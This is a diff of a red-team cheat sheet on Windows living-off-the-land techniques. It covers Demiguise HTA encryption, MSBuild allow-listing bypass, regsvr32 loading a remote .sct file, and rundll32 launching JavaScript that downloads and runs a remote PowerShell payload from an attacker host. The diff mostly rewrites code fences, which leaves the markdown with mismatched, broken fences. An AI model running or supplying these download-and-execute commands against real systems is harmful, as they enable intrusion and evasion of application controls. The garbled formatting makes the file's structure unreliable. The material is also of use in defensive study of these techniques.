@@ -33,10 +33,9 @@ Supported languages
 – Visual Basic Script
 – JavaScript
 
- ```
+```bash
 Red Team Tip: Use the /t <num of seconds> to set a kill timer on the script
-```
-
+```bash
 # Demiguise: HTA Encryption Tool
 
 NCC Group released Demiguise, an HTA encryption tool
@@ -47,8 +46,8 @@ File-type will show text/html instead of HTA
 ```
 C:\> python demiguise.py -k hello -c "notepad.exe" -p
 Outlook.Application -o test.hta
-```
-
+```bash
+```python
 To use Demiguise, download the Python script and use the following flags:
 -k for the encryption key
 -p for the payload
@@ -78,11 +77,11 @@ this technique without the use of MSBuild.exe
 
 ***Application allow listing bypass and malicious code execution***
 
-```
+```bash
 C:\> MSBuild.exe payload.xml
 C:\> MSBuild.exe payload.csproj
 ```
-
+```html
 References:
 https://attack.mitre.org/techniques/T1127/001/
 https://docs.microsoft.com/en-us/visualstudio/msbuild/msbuild?view=vs-2019
@@ -115,8 +114,7 @@ Executed in memory, does not touch disk
 ```
 C:\> regsvr32 /s /n /u /i:https://pwneip.com/payload.sct
 scrobj.dll
-```
-
+```bash
 C:\> regsvr32 /s /n /u /i:https://pwneip.com/payload.sct scrobj.dll
 • Silently without displaying any messages /s
 • To not call the DLL Register Server /n
@@ -126,10 +124,9 @@ C:\> regsvr32 /s /n /u /i:https://pwneip.com/payload.sct scrobj.dll
 
 .SCT = .xml file with 
 
-```
+```bash
 <script language="JScript">
-```
-
+```bash
 ### How it works:
 
 - Use regsrv32 to fetch a .SCT file from the internet
@@ -161,26 +158,23 @@ Execute arbitrary payloads, scripts or Control Panel files (.cpl)
 
 ```
 Control_RunDLL and Control_RunDLLAsUser
-```
-
+```bash
 Execute JavaScript that runs a remote PS script:
 
-```
+```bash
 C:\> rundll32.exe javascript:"\..\mshtml,RunHTMLApplication
 ";document.write();new%20ActiveXObject("WScript.Shell").Run
 ("powershell -nop -exec bypass -c IEX (New-Object
 Net.WebClient).DownloadString('https://pwneip.com/payload.p
 s1');")
-```
-
+```bash
 JavaScript that runs a remote JS:
 
 ```
 C:\> rundll32.exe javascript:"\..\mshtml,RunHTMLApplication
 ";document.write();GetObject("script:https://pwneip.com/pay
 load.ps1")
-```
-
+```bash
 # Shortcuts
 
 • Create new shortcut
